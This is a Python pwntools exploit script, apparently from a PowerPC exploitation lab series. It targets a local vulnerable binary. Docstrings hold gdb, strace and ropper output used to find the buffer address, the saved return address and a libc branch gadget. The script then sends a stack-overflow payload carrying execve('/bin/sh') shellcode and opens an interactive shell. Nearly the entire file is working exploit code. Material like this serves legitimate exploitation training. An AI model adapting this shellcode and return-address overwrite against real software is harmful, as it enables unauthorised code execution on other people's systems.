#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x1000054c <+0>:	stwu    r1,-144(r1)
...
   0x100005a8 <+92>:	lwz     r0,4(r11)
   0x100005ac <+96>:	mtlr    r0
   0x100005b0 <+100>:	lwz     r31,-4(r11)
   0x100005b4 <+104>:	mr      r1,r11
   0x100005b8 <+108>:	blr
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000560: file src/05-shellcode-dynamic.c, line 6.
(gdb) b *0x100005a8
Breakpoint 2 at 0x100005a8: file src/05-shellcode-dynamic.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/05-shellcode-dynamic.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0xffffdd98 "\377\377\335", <incomplete sequence \370>
(gdb) c
Continuing.

Breakpoint 2, 0x100005a8 in vulnerable () at src/05-shellcode-dynamic.c:14
14	}
(gdb) p/x $r11+4
$2 = 0xffffde24
"""

"""
$ qemu-ppc -L /usr/powerpc-linux-gnu/ -strace ./bin/ppc/05-shellcode-dynamic
...
24557 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
24557 mmap2(0x0fe2c000,1848680,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0fe2c000
...
"""

"""
$ ropper --nocolor --file /usr/powerpc-linux-gnu/lib/libc-2.27.so
0x00171014: mtctr r11; bctr;
"""

import struct
import sys

from pwn import *

context(arch='powerpc', os='linux', endian='big', word_size=32)

binary_path = './bin/ppc/05-shellcode-dynamic'

saved_pc_addr = 0xffffde24
buffer_addr = 0xffffdd98
libc_addr = 0x0fe2c000

mtctr_r11_bctr_addr = libc_addr + 0x00171014

# Adapted from http://shell-storm.org/shellcode/files/shellcode-86.php
shellcode = \
	'\x7c\x3f\x0b\x78' + \
	'\x7c\xa5\x2a\x79' + \
	'\x42\x40\xff\xf9' + \
	'\x7f\x08\x02\xa6' + \
	'\x3b\x18\x01\x34' + \
	'\x98\xb8\xfe\xfb' + \
	'\x38\x78\xfe\xf4' + \
	'\x90\x61\xff\xf8' + \
	'\x38\x81\xff\xf8' + \
	'\x90\xa1\xff\xfc' + \
	'\x3b\xc0\x01\x60' + \
	'\x7f\xc0\x2e\x70' + \
	'\x44\x00\x00\x00' + \
	'/bin/shZ'

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr - 4)
# <- $r1 == $r11
payload += p32(0x42000008) # relative branch to $pc+8
payload += p32(mtctr_r11_bctr_addr)
# <- $r1 + 8
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
